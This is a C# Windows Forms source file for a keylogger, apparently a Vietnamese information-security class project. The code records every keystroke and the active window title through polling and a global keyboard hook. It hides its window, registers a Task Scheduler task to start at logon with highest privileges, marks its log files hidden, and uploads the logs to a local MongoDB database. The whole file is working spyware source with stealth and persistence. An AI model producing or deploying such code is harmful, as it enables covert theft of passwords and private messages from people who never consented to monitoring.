using System;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Text;
using System.Collections.Generic;
using Microsoft.Win32;
using MongoDB.Bson;
using MongoDB.Driver;

namespace MyWinFormsApp
{
    public partial class Form1 : Form
    {
        private Thread keyLoggerThread;
        private string userName;
        private bool isLogging = false;
        private string currentLogFilePath = GetLogFilePath();
        private DateTimePicker startDatePicker;
        private DateTimePicker endDatePicker;
        private DateTimePicker startTimePicker;
        private DateTimePicker endTimePicker;
        private TextBox logTextBox;
        private Label userNameLabel;
        private string lastLoggedTimestamp = "";
        private StringBuilder logBuffer = new StringBuilder();
        private object bufferLock = new object();
        private HashSet<Keys> pressedKeys = new HashSet<Keys>();
        private string lastActiveWindow = "";
        private bool isDbConnected = false;
        private static readonly string connectionString = "mongodb://localhost:27017";
        private static readonly string databaseName = "KeyLoggerDB";
        private static readonly string collectionName = "Logs";
        private IMongoCollection<BsonDocument> logCollection;
        private bool isRunningInBackground = false;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Form1 _instance;

        public Form1()
        {
            InitializeComponent();
            _instance = this;
            _hookID = SetHook(_proc);
            this.KeyPreview = true;

            userName = Environment.UserName;

            // Khởi tạo giao diện trong mọi trường hợp
            this.Text = "Key Logger - An toàn thông tin";
            this.Width = 1250;
            this.Height = 750;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.BackColor = System.Drawing.Color.FromArgb(240, 240, 240);
            ConnectToDatabase();
            InitializeCustomComponents(); // Luôn gọi để tạo giao diện

            // Kiểm tra chế độ chạy ẩn
            string[] args = Environment.GetCommandLineArgs();
            if (args.Length > 1 && args[1] == "/background")
            {
                SetRunAtStartup();
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if ((Keys)vkCode == Keys.F4)
                {
                    _instance.OnF4Pressed();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void OnF4Pressed()
        {
            if (isRunningInBackground)
            {
                StopLogging();
                isRunningInBackground = false;
                this.Invoke(new Action(() =>
                {
                    this.Show();
                    this.WindowState = FormWindowState.Normal;
                    this.ShowInTaskbar = true;
                }));
            }
        }

        private static string GetLogFilePath()
        {
            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "KeyLogger");
            if (!Directory.Exists(logDir))
            {
                Directory.CreateDirectory(logDir);
            }
            return Path.Combine(logDir, DateTime.Now.ToString("ddMMyyyy") + ".txt");
        }

        private void ConnectToDatabase()
        {
            try
            {
                var client = new MongoClient(connectionString);
                var database = client.GetDatabase(databaseName);
                logCollection = database.GetCollection<BsonDocument>(collectionName);
                isDbConnected = true;
            }
            catch (Exception ex)
            {
                isDbConnected = false;
                Console.WriteLine($"Không kết nối được MongoDB: {ex.Message}");
            }
        }

        private void InitializeCustomComponents()
        {
            Font defaultFont = new Font("Arial", 10, FontStyle.Regular);

            Label titleLabel = new Label
            {
                Text = "KEY LOGGER",
                Left = 10,
                Top = 10,
                Width = 920,
                Height = 40,
                Font = new Font("Arial", 14, FontStyle.Bold),
                TextAlign = ContentAlignment.MiddleCenter
            };

            Button startButton = new Button { Text = "Bắt đầu", Left = 10, Top = 60, Width = 120, Height = 40, Font = defaultFont, BackColor = System.Drawing.Color.LightGreen };
            Button stopButton = new Button { Text = "Dừng", Left = 140, Top = 60, Width = 120, Height = 40, Font = defaultFont, BackColor = System.Drawing.Color.LightCoral };
            Button goButton = new Button { Text = "Hiển thị", Left = 270, Top = 60, Width = 120, Height = 40, Font = defaultFont, BackColor = System.Drawing.Color.LightBlue };
            Button runInBackgroundButton = new Button { Text = "Hide", Left = 400, Top = 60, Width = 120, Height = 40, Font = defaultFont, BackColor = System.Drawing.Color.LightYellow };

            startDatePicker = new DateTimePicker { Left = 560, Top = 60, Width = 160, Font = defaultFont, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
            startTimePicker = new DateTimePicker { Left = 730, Top = 60, Width = 130, Font = defaultFont, Format = DateTimePickerFormat.Custom, CustomFormat = "HH:mm", ShowUpDown = true };
            endDatePicker = new DateTimePicker { Left = 875, Top = 60, Width = 160, Font = defaultFont, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
            endTimePicker = new DateTimePicker { Left = 1050, Top = 60, Width = 130, Font = defaultFont, Format = DateTimePickerFormat.Custom, CustomFormat = "HH:mm", ShowUpDown = true };

            logTextBox = new TextBox { Left = 10, Top = 150, Width = 960, Height = 350, Multiline = true, ScrollBars = ScrollBars.Vertical, ReadOnly = true, Font = new Font("Consolas", 10, FontStyle.Regular), BackColor = System.Drawing.Color.WhiteSmoke };

            startButton.Click += (sender, e) => StartLogging();
            stopButton.Click += (sender, e) => StopLogging();
            goButton.Click += (sender, e) => DisplayLog();
            runInBackgroundButton.Click += (sender, e) => SetRunAtStartup();

            this.Controls.Add(titleLabel);
            this.Controls.Add(startButton);
            this.Controls.Add(stopButton);
            this.Controls.Add(goButton);
            this.Controls.Add(runInBackgroundButton);
            this.Controls.Add(startDatePicker);
            this.Controls.Add(startTimePicker);
            this.Controls.Add(endDatePicker);
            this.Controls.Add(endTimePicker);
            this.Controls.Add(logTextBox);
            if (userNameLabel != null)
            {
                this.Controls.Add(userNameLabel);
            }
        }

        private void SetRunAtStartup()
        {
            try
            {
                // Ẩn form
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Hide();
                isRunningInBackground = true;

                // Kết nối database (nếu cần)
                ConnectToDatabase();

                // Đường dẫn đến file thực thi của ứng dụng
                string appPath = Application.ExecutablePath;

                // Tên tác vụ trong Task Scheduler
                string taskName = "KeyLoggerTask";

                // Xóa tác vụ cũ nếu đã tồn tại
                ProcessStartInfo deleteTask = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/delete /tn \"{taskName}\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                };
                Process.Start(deleteTask)?.WaitForExit();

                // Tạo tác vụ mới trong Task Scheduler
                ProcessStartInfo createTask = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/create /tn \"{taskName}\" /tr \"\\\"{appPath}\\\" /background\" /sc onlogon /rl highest",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                };
                Process.Start(createTask)?.WaitForExit();

                // Bắt đầu ghi log
                StartLogging();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Lỗi khi thiết lập Task Scheduler: {ex.Message}");
            }
        }

        private void StartLogging()
        {
            if (!isLogging)
            {
                isLogging = true;
                if (!File.Exists(currentLogFilePath))
                {
                    try
                    {
                        File.Create(currentLogFilePath).Close();
                    }
                    catch
                    {
                        currentLogFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "KeyLogger", DateTime.Now.ToString("ddMMyyyy") + ".txt");
                        File.Create(currentLogFilePath).Close();
                    }
                }
                lastLoggedTimestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm");
                keyLoggerThread = new Thread(RecordKeystrokes) { IsBackground = true };
                keyLoggerThread.Start();
            }
        }

        private void StopLogging()
        {
            isLogging = false;
            keyLoggerThread?.Join();
            FlushBufferToFile();
            if (isDbConnected && File.Exists(currentLogFilePath))
            {
                UploadFileToMongoDB(currentLogFilePath);
            }
        }

        private void FlushBufferToFile()
        {
            lock (bufferLock)
            {
                if (logBuffer.Length > 0)
                {
                    File.AppendAllText(currentLogFilePath, $"[{lastLoggedTimestamp}] {logBuffer}\n");
                    logBuffer.Clear();
                }
            }
        }

        private void RecordKeystrokes()
        {
            while (isLogging)
            {
                string todayFile = GetLogFilePath();
                if (!todayFile.Equals(currentLogFilePath))
                {
                    FlushBufferToFile();
                    if (File.Exists(currentLogFilePath))
                    {
                        if (isDbConnected)
                        {
                            UploadFileToMongoDB(currentLogFilePath);
                        }
                        if (File.Exists(currentLogFilePath) && (File.GetAttributes(currentLogFilePath) & FileAttributes.Hidden) != FileAttributes.Hidden)
                        {
                            File.SetAttributes(currentLogFilePath, File.GetAttributes(currentLogFilePath) | FileAttributes.Hidden);
                        }
                    }

                    currentLogFilePath = todayFile;
                    if (!File.Exists(currentLogFilePath))
                    {
                        File.Create(currentLogFilePath).Close();
                    }
                    lastLoggedTimestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm");
                }

                string currentTimestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm");

                lock (bufferLock)
                {
                    if (currentTimestamp != lastLoggedTimestamp && logBuffer.Length > 0)
                    {
                        File.AppendAllText(currentLogFilePath, $"[{lastLoggedTimestamp}] {logBuffer}\n");
                        logBuffer.Clear();
                        lastLoggedTimestamp = currentTimestamp;
                    }
                }

                string activeWindowTitle = GetActiveWindowTitle();
                if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != lastActiveWindow)
                {
                    lock (bufferLock)
                    {
                        logBuffer.Append($"[Window: {activeWindowTitle}] ");
                    }
                    lastActiveWindow = activeWindowTitle;
                }

                bool currentShiftPressed = (GetAsyncKeyState(Keys.LShiftKey) & 0x8000) != 0 ||
                                           (GetAsyncKeyState(Keys.RShiftKey) & 0x8000) != 0;

                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    int keyState = GetAsyncKeyState(key);
                    if ((keyState & 0x8000) != 0)
                    {
                        if (!pressedKeys.Contains(key))
                        {
                            pressedKeys.Add(key);
                            lock (bufferLock)
                            {
                                if (key == Keys.Tab || key == Keys.Enter)
                                {
                                    logBuffer.Append($"[{key}]");
                                }
                                else if (key >= Keys.A && key <= Keys.Z)
                                {
                                    string keyValue = key.ToString();
                                    keyValue = currentShiftPressed ? keyValue : keyValue.ToLower();
                                    logBuffer.Append(keyValue);
                                }
                                else if (key >= Keys.D0 && key <= Keys.D9)
                                {
                                    char num = (char)('0' + (key - Keys.D0));
                                    if (currentShiftPressed)
                                    {
                                        string specialChars = ")!@#$%^&*(";
                                        num = specialChars[key - Keys.D0];
                                    }
                                    logBuffer.Append(num);
                                }
                                else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                                {
                                    char num = (char)('0' + (key - Keys.NumPad0));
                                    logBuffer.Append(num);
                                }
                                else if (key == Keys.Space)
                                {
                                    logBuffer.Append(" ");
                                }
                                else if (key == Keys.CapsLock)
                                {
                                    logBuffer.Append("[CapsLock]");
                                }
                                else if (key == Keys.ControlKey)
                                {
                                    logBuffer.Append("[Ctrl]");
                                }
                                else if (key == Keys.Menu)
                                {
                                    logBuffer.Append("[Alt]");
                                }
                                else if (key == Keys.LShiftKey || key == Keys.RShiftKey)
                                {
                                    logBuffer.Append("[Shift]");
                                }
                                else if (key >= Keys.F1 && key <= Keys.F12)
                                {
                                    logBuffer.Append($"[{key}]");
                                }
                                else if (key == Keys.Escape)
                                {
                                    logBuffer.Append("[Esc]");
                                }
                                else if (key == Keys.LWin || key == Keys.RWin)
                                {
                                    logBuffer.Append("[Win]");
                                }
                                else if (key == Keys.Up)
                                {
                                    logBuffer.Append("[Up]");
                                }
                                else if (key == Keys.Down)
                                {
                                    logBuffer.Append("[Down]");
                                }
                                else if (key == Keys.Left)
                                {
                                    logBuffer.Append("[Left]");
                                }
                                else if (key == Keys.Right)
                                {
                                    logBuffer.Append("[Right]");
                                }
                            }
                        }
                    }
                    else
                    {
                        pressedKeys.Remove(key);
                    }
                }

                Thread.Sleep(50);
            }

            FlushBufferToFile();
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void UploadFileToMongoDB(string filePath)
        {
            try
            {
                if (File.Exists(filePath) && isDbConnected)
                {
                    string fileDate = Path.GetFileNameWithoutExtension(filePath);
                    string[] logLines = File.ReadAllLines(filePath, Encoding.UTF8);

                    var filter = Builders<BsonDocument>.Filter.And(
                        Builders<BsonDocument>.Filter.Eq("date", fileDate),
                        Builders<BsonDocument>.Filter.Eq("user", userName)
                    );
                    var update = Builders<BsonDocument>.Update.PushEach("logs", logLines)
                                                            .Set("lastUpdate", DateTime.Now.ToString("yyyy-MM-dd HH:mm"));

                    var result = logCollection.UpdateOne(filter, update, new UpdateOptions { IsUpsert = true });
                    if (result.ModifiedCount > 0 || result.UpsertedId != null)
                    {
                        if ((File.GetAttributes(filePath) & FileAttributes.Hidden) != FileAttributes.Hidden)
                        {
                            File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Lỗi khi upload lên MongoDB: {ex.Message}");
            }
        }

        private void DisplayLog()
        {
            if (!isDbConnected)
            {
                logTextBox.Text = "Không kết nối được với MongoDB.";
                return;
            }

            try
            {
                DateTime startDateTime = DateTime.ParseExact(
                    startDatePicker.Value.ToString("yyyy-MM-dd") + " " + startTimePicker.Value.ToString("HH:mm"),
                    "yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture);
                DateTime endDateTime = DateTime.ParseExact(
                    endDatePicker.Value.ToString("yyyy-MM-dd") + " " + endTimePicker.Value.ToString("HH:mm"),
                    "yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture);

                string startDateStr = startDateTime.ToString("ddMMyyyy");
                string endDateStr = endDateTime.ToString("ddMMyyyy");

                var filter = Builders<BsonDocument>.Filter.And(
                    Builders<BsonDocument>.Filter.Gte("date", startDateStr),
                    Builders<BsonDocument>.Filter.Lte("date", endDateStr),
                    Builders<BsonDocument>.Filter.Eq("user", userName)
                );

                var logs = logCollection.Find(filter).ToList();
                HashSet<string> uniqueLogs = new HashSet<string>();

                foreach (var logDoc in logs)
                {
                    var logLines = logDoc["logs"].AsBsonArray.Select(l => l.AsString).ToArray();
                    foreach (string line in logLines)
                    {
                        if (line.Length >= 18 && line.StartsWith("[") && DateTime.TryParseExact(line.Substring(1, 16), "yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture, DateTimeStyles.None, out DateTime logTime))
                        {
                            if (logTime >= startDateTime && logTime <= endDateTime)
                            {
                                string cleanedLine = line.Trim();
                                uniqueLogs.Add(cleanedLine);
                            }
                        }
                    }
                }

                logTextBox.Text = uniqueLogs.Count > 0 ? string.Join(Environment.NewLine, uniqueLogs) : "Không có dữ liệu trong khoảng thời gian này.";
            }
            catch (Exception ex)
            {
                logTextBox.Text = "Lỗi khi đọc từ MongoDB: " + ex.Message;
            }
        }
    }
}